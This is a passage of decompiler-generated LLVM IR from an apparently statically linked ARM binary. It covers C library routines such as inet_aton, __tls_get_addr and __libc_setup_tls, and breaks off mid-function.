  %v2_17b90 = add i32 %v1_17b90, 12
  %v3_17b90 = inttoptr i32 %v2_17b90 to i32*
  store i32 %v0_17b90, i32* %v3_17b90, align 4
  %v2_17b94 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_17b94, i32* @r1, align 4
  %v1_17b9c = load i32, i32* @r4, align 4
  %v2_17b9c = inttoptr i32 %v1_17b9c to i32*
  store i32 %v3_17b84, i32* %v2_17b9c, align 4
  %v0_17ba0 = load i32, i32* @ip, align 4
  %v1_17ba0 = trunc i32 %v0_17ba0 to i8
  %v2_17ba0 = load i32, i32* @r4, align 4
  %v3_17ba0 = add i32 %v2_17ba0, 16
  %v4_17ba0 = inttoptr i32 %v3_17ba0 to i8*
  store i8 %v1_17ba0, i8* %v4_17ba0, align 1
  %v0_17ba4 = load i32, i32* @r4, align 4
  %v1_17ba4 = add i32 %v0_17ba4, 17
  store i32 %v1_17ba4, i32* %r0.global-to-local, align 4
  %v4_17ba8 = call i32 @__GI_mempcpy(i32 %v1_17ba4, i32 %v2_17b94, i32 19, i32 %v3_17b84)
  store i32 %v4_17ba8, i32* %r0.global-to-local, align 4
  %v0_17bac = load i32, i32* @r5, align 4
  store i32 %v0_17bac, i32* %r1.global-to-local, align 4
  %v3_17bb4 = inttoptr i32 %v4_17ba8 to i8*
  %v4_17bb4 = call i32 @__GI_memset(i8* %v3_17bb4, i32 %v0_17bac, i32 13)
  store i32 %v4_17bb4, i32* %r0.global-to-local, align 4
  %v0_17bb8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17bb8

dec_label_pc_17bb8:                               ; preds = %entry, %dec_label_pc_17b74
  %v0_17bb8 = phi i32 [ %v3_17b68, %entry ], [ %v0_17bb8.pre, %dec_label_pc_17b74 ]
  store i32 %v0_17bb8, i32* %r0.global-to-local, align 4
  store i32 %v3_17b50, i32* @r4, align 4
  store i32 %v6_17b50, i32* @r5, align 4
  store i32 %v9_17b50, i32* @r6, align 4
  ret i32 %v0_17bb8

; uselistorder directives
  uselistorder i32 %v0_17bb8, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 17, { 16, 1, 4, 19, 20, 5, 21, 17, 18, 6, 7, 8, 9, 10, 11, 22, 12, 23, 13, 24, 25, 14, 26, 15, 2, 27, 3, 28, 29, 30, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17bb8, { 1, 0 }
}

define i32 @inet_aton() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_17bcc = load i32, i32* @r4, align 4
  store i32 %v3_17bcc, i32* %stack_var_-28, align 4
  %v0_17bd4 = load i32, i32* @r0, align 4
  %v2_17bd4 = icmp eq i32 %v0_17bd4, 0
  %v0_17bdc = load i32, i32* @r1, align 4
  br i1 %v2_17bd4, label %dec_label_pc_17cb0, label %dec_label_pc_17be4

dec_label_pc_17be4:                               ; preds = %entry
  br label %dec_label_pc_17bfc

dec_label_pc_17bfc:                               ; preds = %dec_label_pc_17be4, %dec_label_pc_17c74
  %v1_17c74 = phi i32 [ 0, %dec_label_pc_17be4 ], [ %v5_17c74, %dec_label_pc_17c74 ]
  %v0_17c78 = phi i32 [ 1, %dec_label_pc_17be4 ], [ %v1_17c78, %dec_label_pc_17c74 ]
  %v0_17bfc = phi i32 [ %v0_17bd4, %dec_label_pc_17be4 ], [ %v0_17bfc13, %dec_label_pc_17c74 ]
  %v1_17bfc = inttoptr i32 %v0_17bfc to i8*
  %v2_17bfc = load i8, i8* %v1_17bfc, align 1
  %v3_17bfc = zext i8 %v2_17bfc to i32
  %v4_17c00 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 276) to i32*), align 4
  %v2_17c04 = mul nuw nsw i32 %v3_17bfc, 2
  %v2_17c08 = add i32 %v2_17c04, %v4_17c00
  %v3_17c08 = inttoptr i32 %v2_17c08 to i16*
  %v4_17c08 = load i16, i16* %v3_17c08, align 2
  %v1_17c0c = and i16 %v4_17c08, 8
  %v2_17c0c = icmp eq i16 %v1_17c0c, 0
  br i1 %v2_17c0c, label %dec_label_pc_17cb0, label %dec_label_pc_17c14

dec_label_pc_17c14:                               ; preds = %dec_label_pc_17bfc
  br label %dec_label_pc_17c34

dec_label_pc_17c1c:                               ; preds = %dec_label_pc_17c34
  %v2_17c1c = mul i32 %v0_17c74, 10
  %v1_17c20 = add i32 %v2_17c1c, -48
  %v2_17c24 = add i32 %v3_17c34, %v1_17c20
  %v8_17c2c = icmp sgt i32 %v2_17c24, 255
  br i1 %v8_17c2c, label %dec_label_pc_17cb0, label %dec_label_pc_17c30

dec_label_pc_17c30:                               ; preds = %dec_label_pc_17c1c
  %v1_17c30 = add i32 %v0_17c64, 1
  store i32 %v1_17c30, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17c34

dec_label_pc_17c34:                               ; preds = %dec_label_pc_17c14, %dec_label_pc_17c30
  %v0_17c74 = phi i32 [ 0, %dec_label_pc_17c14 ], [ %v2_17c24, %dec_label_pc_17c30 ]
  %v0_17c64 = phi i32 [ %v0_17bfc, %dec_label_pc_17c14 ], [ %v1_17c30, %dec_label_pc_17c30 ]
  %v1_17c34 = inttoptr i32 %v0_17c64 to i8*
  %v2_17c34 = load i8, i8* %v1_17c34, align 1
  %v3_17c34 = zext i8 %v2_17c34 to i32
  %v2_17c38 = mul nuw nsw i32 %v3_17c34, 2
  %v2_17c3c = add i32 %v2_17c38, %v4_17c00
  %v3_17c3c = inttoptr i32 %v2_17c3c to i16*
  %v4_17c3c = load i16, i16* %v3_17c3c, align 2
  %v6_17c3c = zext i16 %v4_17c3c to i32
  %v1_17c40 = and i32 %v6_17c3c, 8
  %v2_17c40 = icmp eq i32 %v1_17c40, 0
  br i1 %v2_17c40, label %dec_label_pc_17c48, label %dec_label_pc_17c1c

dec_label_pc_17c48:                               ; preds = %dec_label_pc_17c34
  %v7_17c48 = icmp eq i32 %v0_17c78, 4
  br i1 %v7_17c48, label %dec_label_pc_17c60, label %dec_label_pc_17c50

dec_label_pc_17c50:                               ; preds = %dec_label_pc_17c48
  %v7_17c50 = icmp eq i8 %v2_17c34, 46
  br i1 %v7_17c50, label %dec_label_pc_17c58, label %dec_label_pc_17cb0

dec_label_pc_17c58:                               ; preds = %dec_label_pc_17c50
  %v1_17c58 = add i32 %v0_17c64, 1
  store i32 %v1_17c58, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17c74

dec_label_pc_17c60:                               ; preds = %dec_label_pc_17c48
  %v2_17c60 = icmp eq i8 %v2_17c34, 0
  %v1_17c64 = add i32 %v0_17c64, 1
  store i32 %v1_17c64, i32* %r0.global-to-local, align 4
  br i1 %v2_17c60, label %dec_label_pc_17c74, label %dec_label_pc_17c6c

dec_label_pc_17c6c:                               ; preds = %dec_label_pc_17c60
  %v1_17c6c = and i32 %v6_17c3c, 32
  %v2_17c6c = icmp eq i32 %v1_17c6c, 0
  br i1 %v2_17c6c, label %dec_label_pc_17cb0, label %dec_label_pc_17c74

dec_label_pc_17c74:                               ; preds = %dec_label_pc_17c6c, %dec_label_pc_17c60, %dec_label_pc_17c58
  %v0_17bfc13 = phi i32 [ %v1_17c64, %dec_label_pc_17c6c ], [ %v1_17c64, %dec_label_pc_17c60 ], [ %v1_17c58, %dec_label_pc_17c58 ]
  %v4_17c74 = mul i32 %v1_17c74, 256
  %v5_17c74 = or i32 %v0_17c74, %v4_17c74
  %v1_17c78 = add nuw nsw i32 %v0_17c78, 1
  %v7_17c80 = icmp slt i32 %v1_17c78, 5
  br i1 %v7_17c80, label %dec_label_pc_17bfc, label %dec_label_pc_17c84

dec_label_pc_17c84:                               ; preds = %dec_label_pc_17c74
  %v2_17c84 = icmp eq i32 %v0_17bdc, 0
  br i1 %v2_17c84, label %.thread8.thread, label %bb

.thread8.thread:                                  ; preds = %dec_label_pc_17c84
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17cb4

bb:                                               ; preds = %dec_label_pc_17c84
  %v4_17c88 = udiv i32 %v5_17c74, 16777216
  %v2_17c8c = udiv i32 %v5_17c74, 256
  %v5_17c90 = and i32 %v2_17c8c, 65280
  %v2_17c94 = and i32 %v5_17c74, ptrtoint (i32* @global_var_ff00.33 to i32)
  %v5_17c98 = mul i32 %v2_17c94, 256
  %v5_17c9c = mul i32 %v0_17c74, 16777216
  %v6_17c90 = or i32 %v4_17c88, %v5_17c9c
  %v6_17c98 = or i32 %v6_17c90, %v5_17c90
  %v6_17c9c = or i32 %v6_17c98, %v5_17c98
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_17ca8 = inttoptr i32 %v0_17bdc to i32*
  store i32 %v6_17c9c, i32* %v3_17ca8, align 4
  %v2_17cb4.pre = load i32, i32* %stack_var_-28, align 4
  %v1_17cb8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17cb4

dec_label_pc_17cb0:                               ; preds = %dec_label_pc_17c50, %dec_label_pc_17c6c, %dec_label_pc_17bfc, %dec_label_pc_17c1c, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17cb4

dec_label_pc_17cb4:                               ; preds = %.thread8.thread, %bb, %dec_label_pc_17cb0
  %v1_17cb8 = phi i32 [ %v1_17cb8.pre, %bb ], [ 0, %dec_label_pc_17cb0 ], [ 1, %.thread8.thread ]
  %v2_17cb4 = phi i32 [ %v2_17cb4.pre, %bb ], [ %v3_17bcc, %dec_label_pc_17cb0 ], [ %v3_17bcc, %.thread8.thread ]
  store i32 %v2_17cb4, i32* @r4, align 4
  ret i32 %v1_17cb8

; uselistorder directives
  uselistorder i32 %v1_17c78, { 1, 0 }
  uselistorder i32 %v5_17c74, { 2, 0, 1, 3 }
  uselistorder i32 %v0_17c64, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 1, 2, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_ff00.33 to i32), { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 65280, { 1, 2, 10, 3, 0, 4, 11, 12, 13, 14, 15, 16, 17, 18, 47, 19, 20, 21, 22, 23, 5, 48, 24, 25, 6, 26, 49, 44, 27, 28, 29, 30, 31, 45, 7, 50, 46, 8, 51, 9, 32, 33, 52, 34, 35, 36, 37, 38, 39, 53, 40, 41, 42, 43 }
  uselistorder i8 46, { 0, 1, 3, 2 }
  uselistorder i32 255, { 4, 5, 0, 1, 2, 6, 3 }
  uselistorder i16 0, { 0, 1, 2, 7, 8, 3, 4, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 5, 20, 6, 21, 22 }
  uselistorder i32 276, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17cb4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17cb0, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_17c34, { 1, 0 }
  uselistorder label %dec_label_pc_17bfc, { 1, 0 }
}

define i32 @init_static_tls() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v3_17cd0 = load i32, i32* @r4, align 4
  store i32 %v3_17cd0, i32* %stack_var_-16, align 4
  %v4_17cd4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 72) to i32*), align 4
  store i32 60, i32* %r3.global-to-local, align 4
  %v4_17cdc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 60) to i32*), align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_17ce4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 36) to i32*), align 4
  store i32 %v4_17ce4, i32* %r4.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  %v1_17cec = inttoptr i32 %v4_17cd4 to i32*
  %v2_17cec = load i32, i32* %v1_17cec, align 4
  %v4_17cf0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 52) to i32*), align 4
  store i32 %v4_17cf0, i32* %lr.global-to-local, align 4
  store i32 144, i32* %r3.global-to-local, align 4
  %v1_17cf8 = add i32 %v2_17cec, 15
  %v4_17cfc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 144) to i32*), align 4
  store i32 %v4_17cfc, i32* @ip, align 4
  %v1_17d00 = load i32, i32* @r0, align 4
  %v2_17d00 = add i32 %v1_17d00, %v1_17cf8
  %v1_17d04 = inttoptr i32 %v4_17cdc to i32*
  %v2_17d04 = load i32, i32* %v1_17d04, align 4
  store i32 %v2_17d04, i32* %r3.global-to-local, align 4
  %v1_17d08 = and i32 %v2_17d00, -16
  store i32 %v1_17d08, i32* %v1_17cec, align 4
  %v0_17d10 = load i32, i32* @r0, align 4
  %v1_17d10 = load i32, i32* %r4.global-to-local, align 4
  %v2_17d10 = inttoptr i32 %v1_17d10 to i32*
  store i32 %v0_17d10, i32* %v2_17d10, align 4
  %v0_17d14 = load i32, i32* @r1, align 4
  %v1_17d14 = load i32, i32* %lr.global-to-local, align 4
  %v2_17d14 = inttoptr i32 %v1_17d14 to i32*
  store i32 %v0_17d14, i32* %v2_17d14, align 4
  %v0_17d18 = load i32, i32* %r3.global-to-local, align 4
  %v1_17d18 = load i32, i32* @ip, align 4
  %v2_17d18 = inttoptr i32 %v1_17d18 to i32*
  store i32 %v0_17d18, i32* %v2_17d18, align 4
  %v2_17d1c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17d1c, i32* %r4.global-to-local, align 4
  %v1_17d20 = load i32, i32* @r0, align 4
  ret i32 %v1_17d20

; uselistorder directives
  uselistorder i32 -16, { 21, 6, 7, 8, 9, 10, 11, 12, 13, 14, 5, 4, 3, 1, 15, 16, 17, 18, 19, 20, 2, 0 }
}

define i32 @function_17d28(i32 %arg1) local_unnamed_addr {
dec_label_pc_17d28:
  %v0_17d28 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17d28, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_17d28
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_17d28, %bb
  %v4_17d38 = phi i32 [ %arg1, %dec_label_pc_17d28 ], [ 0, %bb ]
  ret i32 %v4_17d38

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @_dl_tls_setup(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %r3.global-to-local, align 4
  %v4_17d4c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 84) to i32*), align 4
  store i32 %v4_17d4c, i32* @lr, align 4
  %v4_17d58 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 60) to i32*), align 4
  store i32 64, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 10748) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 10748), i32* %r3.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  store i32 16, i32* @r1, align 4
  %v2_17d78 = inttoptr i32 %v4_17d58 to i32*
  store i32 1, i32* %v2_17d78, align 4
  %v0_17d7c = load i32, i32* %r3.global-to-local, align 4
  %v1_17d7c = load i32, i32* @lr, align 4
  %v2_17d7c = inttoptr i32 %v1_17d7c to i32*
  store i32 %v0_17d7c, i32* %v2_17d7c, align 4
  %v0_17d80 = call i32 @init_static_tls()
  ret i32 0
}

define i32 @function_17d98(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_17d98:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_17d98 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17d98, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17d98
  %v2_17d98 = load i32, i32* @r4, align 4
  %v8_17d98 = ashr i32 %v2_17d98, %tmp
  %v9_17d98 = and i32 %v8_17d98, %tmp
  %v2_17d9c = load i32, i32* @ip, align 4
  %v8_17d9c = lshr i32 %v2_17d9c, %v9_17d98
  %v9_17d9c = and i32 %v8_17d9c, %v9_17d98
  store i32 %v9_17d9c, i32* %r0.global-to-local, align 4
  %v4_17da0 = inttoptr i32 %v9_17d9c to i32*
  store i32 %arg2, i32* %v4_17da0, align 4
  %v5_17da0 = load i32, i32* @ip, align 4
  %v6_17da0 = load i32, i32* %r0.global-to-local, align 4
  %v7_17da0 = sub i32 %v6_17da0, %v5_17da0
  store i32 %v7_17da0, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17d98, %bb
  %v8_17da0 = phi i32 [ %tmp, %dec_label_pc_17d98 ], [ %v7_17da0, %bb ]
  ret i32 %v8_17da0

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__tls_get_addr(i32 %arg1) local_unnamed_addr {
entry:
  %v0_17dac = call i32 @__aeabi_read_tp()
  %v1_17db0 = inttoptr i32 %v0_17dac to i32*
  %v2_17db0 = load i32, i32* %v1_17db0, align 4
  %v1_17db4 = add i32 %arg1, 4
  %v2_17db4 = inttoptr i32 %v1_17db4 to i32*
  %v3_17db4 = load i32, i32* %v2_17db4, align 4
  %v1_17db8 = add i32 %v2_17db0, 8
  %v2_17db8 = inttoptr i32 %v1_17db8 to i32*
  %v3_17db8 = load i32, i32* %v2_17db8, align 4
  %v2_17dbc = add i32 %v3_17db8, %v3_17db4
  ret i32 %v2_17dbc
}

define i32 @__libc_setup_tls(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_17dc8 = load i32, i32* @r4, align 4
  store i32 %v3_17dc8, i32* %stack_var_-36, align 4
  %v6_17dc8 = load i32, i32* @r5, align 4
  %v15_17dc8 = load i32, i32* @r8, align 4
  %v18_17dc8 = load i32, i32* @sb, align 4
  %v21_17dc8 = load i32, i32* @sl, align 4
  %v24_17dc8 = load i32, i32* @fp, align 4
  %v27_17dc8 = load i32, i32* @lr, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %sl.global-to-local, align 4
  %v4_17dd8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 104) to i32*), align 4
  store i32 %v4_17dd8, i32* %r3.global-to-local, align 4
  %v1_17ddc = inttoptr i32 %v4_17dd8 to i32*
  %v2_17ddc = load i32, i32* %v1_17ddc, align 4
  store i32 %v2_17ddc, i32* %r2.global-to-local, align 4
  %v2_17de0 = icmp eq i32 %v2_17ddc, 0
  %v0_17de8 = load i32, i32* %r0.global-to-local, align 4
  %v0_17dec = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_17dec, i32* %ip.global-to-local, align 4
  br i1 %v2_17de0, label %dec_label_pc_17fb4, label %dec_label_pc_17df4

dec_label_pc_17df4:                               ; preds = %entry
  store i32 156, i32* %r3.global-to-local, align 4
  %v4_17df8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 156) to i32*), align 4
  store i32 %v4_17df8, i32* @lr, align 4
  store i32 %v2_17ddc, i32* %r1.global-to-local, align 4
  %v1_17e40 = inttoptr i32 %v4_17df8 to i32*
  %v2_17e4061 = load i32, i32* %v1_17e40, align 4
  %v4_17e4462 = mul i32 %v2_17e4061, 32
  %v5_17e4463 = add i32 %v4_17e4462, %v2_17ddc
  store i32 %v5_17e4463, i32* %r3.global-to-local, align 4
  %v3_17e4865 = icmp ult i32 %v2_17ddc, %v5_17e4463
  br i1 %v3_17e4865, label %dec_label_pc_17e04, label %dec_label_pc_17fb4.loopexit

dec_label_pc_17e04:                               ; preds = %dec_label_pc_17df4, %dec_label_pc_17e3c
  %v0_17e1c66 = phi i32 [ %v1_17e3c, %dec_label_pc_17e3c ], [ %v2_17ddc, %dec_label_pc_17df4 ]
  %v1_17e04 = inttoptr i32 %v0_17e1c66 to i32*
  %v2_17e04 = load i32, i32* %v1_17e04, align 4
  store i32 %v2_17e04, i32* %r3.global-to-local, align 4
  %v7_17e08 = icmp eq i32 %v2_17e04, 7
  br i1 %v7_17e08, label %dec_label_pc_17e10, label %dec_label_pc_17e3c

dec_label_pc_17e10:                               ; preds = %dec_label_pc_17e04
  %v1_17e10 = add i32 %v0_17e1c66, 20
  %v2_17e10 = inttoptr i32 %v1_17e10 to i32*
  %v3_17e10 = load i32, i32* %v2_17e10, align 4
  store i32 %v3_17e10, i32* %r3.global-to-local, align 4
  %v1_17e14 = add i32 %v0_17e1c66, 28
  %v2_17e14 = inttoptr i32 %v1_17e14 to i32*
  %v3_17e14 = load i32, i32* %v2_17e14, align 4
  store i32 %v3_17e14, i32* @r6, align 4
  %v1_17e1c = add i32 %v0_17e1c66, 16
  %v2_17e1c = inttoptr i32 %v1_17e1c to i32*
  %v3_17e1c = load i32, i32* %v2_17e1c, align 4
  store i32 %v3_17e1c, i32* %r3.global-to-local, align 4
  %v1_17e20 = add i32 %v0_17e1c66, 8
  %v2_17e20 = inttoptr i32 %v1_17e20 to i32*
  %v3_17e20 = load i32, i32* %v2_17e20, align 4
  store i32 %v3_17e20, i32* %r1.global-to-local, align 4
  %tmp78 = icmp ule i32 %v3_17e14, %v0_17dec
  %v0_17dec.v3_17e14 = select i1 %tmp78, i32 %v0_17dec, i32 %v3_17e14
  store i32 %v0_17dec.v3_17e14, i32* %fp.global-to-local, align 4
  %v2_17e58 = icmp eq i32 %v3_17e14, 0
  br i1 %v2_17e58, label %dec_label_pc_17e80, label %bb

dec_label_pc_17e3c:                               ; preds = %dec_label_pc_17e04
  %v1_17e3c = add i32 %v0_17e1c66, 32
  store i32 %v1_17e3c, i32* %r1.global-to-local, align 4
  %v2_17e40 = load i32, i32* %v1_17e40, align 4
  %v4_17e44 = mul i32 %v2_17e40, 32
  %v5_17e44 = add i32 %v4_17e44, %v2_17ddc
  store i32 %v5_17e44, i32* %r3.global-to-local, align 4
  %v3_17e48 = icmp ult i32 %v1_17e3c, %v5_17e44
  br i1 %v3_17e48, label %dec_label_pc_17e04, label %dec_label_pc_17e40.dec_label_pc_17fb4.loopexit_crit_edge

bb:                                               ; preds = %dec_label_pc_17e10
  %v2_17e5c = add i32 %v3_17e14, -1
  br label %dec_label_pc_17e84

dec_label_pc_17e80:                               ; preds = %dec_label_pc_17e10, %dec_label_pc_17fb4
  %v0_17e94.pre = phi i32 [ %v0_17e94.pre.pre, %dec_label_pc_17fb4 ], [ ptrtoint (i32* @global_var_22204.365 to i32), %dec_label_pc_17e10 ]
  %v1_17e84.pre = phi i32 [ %v1_17e84.pre.pre, %dec_label_pc_17fb4 ], [ %v0_17de8, %dec_label_pc_17e10 ]
  %v1_17ea825 = phi i32 [ %v0_17fbc, %dec_label_pc_17fb4 ], [ %v0_17dec.v3_17e14, %dec_label_pc_17e10 ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_17fb4 ], [ %v3_17e10, %dec_label_pc_17e10 ]
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_17fb4 ], [ %v3_17e1c, %dec_label_pc_17e10 ]
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_17fb4 ], [ %v3_17e20, %dec_label_pc_17e10 ]
  br label %dec_label_pc_17e84

dec_label_pc_17e84:                               ; preds = %bb, %dec_label_pc_17e80
  %storemerge80 = phi i32 [ %v2_17e5c, %bb ], [ 0, %dec_label_pc_17e80 ]
  %v0_17e84 = phi i32 [ %v2_17e5c, %bb ], [ 0, %dec_label_pc_17e80 ]
  %storemerge = phi i32 [ %v3_17e14, %bb ], [ 1, %dec_label_pc_17e80 ]
  %storemerge79 = phi i32 [ %v3_17e14, %bb ], [ 1, %dec_label_pc_17e80 ]
  %v0_17e94 = phi i32 [ ptrtoint (i32* @global_var_22204.365 to i32), %bb ], [ %v0_17e94.pre, %dec_label_pc_17e80 ]
  %v1_17e84 = phi i32 [ %v0_17de8, %bb ], [ %v1_17e84.pre, %dec_label_pc_17e80 ]
  %v1_17ea8 = phi i32 [ %v0_17dec.v3_17e14, %bb ], [ %v1_17ea825, %dec_label_pc_17e80 ]
  %stack_var_-52.3 = phi i32 [ %v3_17e10, %bb ], [ %stack_var_-52.0, %dec_label_pc_17e80 ]
  %stack_var_-48.3 = phi i32 [ %v3_17e1c, %bb ], [ %stack_var_-48.0, %dec_label_pc_17e80 ]
  %stack_var_-44.3 = phi i32 [ %v3_17e20, %bb ], [ %stack_var_-44.0, %dec_label_pc_17e80 ]
  store i32 %storemerge80, i32* %r0.global-to-local, align 4
  store i32 %storemerge79, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_17e84 = add i32 %v1_17e84, %v0_17e84
  %v2_17e88 = udiv i32 %v2_17e84, %storemerge
  store i32 %v2_17e88, i32* %r0.global-to-local, align 4
  %v2_17e8c = mul i32 %v2_17e88, %storemerge
  store i32 %v2_17e8c, i32* %sb.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v2_17e94 = add i32 %v0_17e94, 72
  %v3_17e94 = inttoptr i32 %v2_17e94 to i32*
  %v4_17e94 = load i32, i32* %v3_17e94, align 4
  store i32 %v4_17e94, i32* %r3.global-to-local, align 4
  %v1_17e98 = inttoptr i32 %v4_17e94 to i32*
  %v2_17e98 = load i32, i32* %v1_17e98, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v1_17ea0 = add i32 %v1_17ea8, 1168
  %v2_17ea4 = add i32 %v1_17ea0, %stack_var_-52.3
  %v2_17ea8 = add i32 %v2_17ea4, %v2_17e8c
  %v2_17eac = add i32 %v2_17ea8, %v2_17e98
  store i32 %v2_17eac, i32* %r0.global-to-local, align 4
  %v1_17eb0 = call i32 @__GI_sbrk(i32 %v2_17eac)
  %v1_17eb4 = load i32, i32* %fp.global-to-local, align 4
  %v1_17ebc = sub i32 0, %v1_17eb4
  store i32 10236, i32* %r4.global-to-local, align 4
  %v2_17eb4 = add i32 %v1_17eb0, 1167
  %v1_17ec4 = add i32 %v2_17eb4, %v1_17eb4
  %v2_17ec8 = and i32 %v1_17ec4, %v1_17ebc
  store i32 %v2_17ec8, i32* @r5, align 4
  %v1_17ed0 = load i32, i32* %sl.global-to-local, align 4
  %v3_17ed0 = add i32 %v1_17ed0, 10236
  %v4_17ed0 = inttoptr i32 %v3_17ed0 to i32*
  store i32 62, i32* %v4_17ed0, align 4
  %v0_17ed8 = load i32, i32* @r5, align 4
  %v1_17ed8 = load i32, i32* %sb.global-to-local, align 4
  %v2_17ed8 = add i32 %v1_17ed8, %v0_17ed8
  store i32 %v2_17ed8, i32* @ip, align 4
  %v0_17edc = load i32, i32* %sl.global-to-local, align 4
  %v1_17edc = load i32, i32* %r4.global-to-local, align 4
  %v2_17edc = add i32 %v1_17edc, %v0_17edc
  store i32 %v2_17edc, i32* %r4.global-to-local, align 4
  %v2_17ee0 = add i32 %v0_17edc, 11524
  store i32 %v2_17ee0, i32* %r8.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  store i32 %stack_var_-44.3, i32* @r1, align 4
  store i32 %stack_var_-48.3, i32* @r2, align 4
  store i32 %v2_17ed8, i32* @r0, align 4
  %v2_17ef4 = add i32 %v2_17edc, 16
  %v3_17ef4 = inttoptr i32 %v2_17ef4 to i32*
  store i32 %v2_17ed8, i32* %v3_17ef4, align 4
  %v0_17ef8 = load i32, i32* %sb.global-to-local, align 4
  %v1_17ef8 = load i32, i32* %r8.global-to-local, align 4
  %v2_17ef8 = add i32 %v1_17ef8, 40
  %v3_17ef8 = inttoptr i32 %v2_17ef8 to i32*
  store i32 %v0_17ef8, i32* %v3_17ef8, align 4
  %v0_17efc = load i32, i32* @r3, align 4
  %v1_17efc = trunc i32 %v0_17efc to i8
  %v2_17efc = load i32, i32* %r4.global-to-local, align 4
  %v3_17efc = add i32 %v2_17efc, 20
  %v4_17efc = inttoptr i32 %v3_17efc to i8*
  store i8 %v1_17efc, i8* %v4_17efc, align 1
  %v0_17f00 = load i32, i32* %r4.global-to-local, align 4
  %v1_17f00 = add i32 %v0_17f00, 8
  store i32 %v1_17f00, i32* @r4, align 4
  %v0_17f04 = call i32 @memcpy()
  %v0_17f0c = load i32, i32* @r4, align 4
  %v1_17f0c = load i32, i32* @r5, align 4
  %v2_17f0c = inttoptr i32 %v1_17f0c to i32*
  store i32 %v0_17f0c, i32* %v2_17f0c, align 4
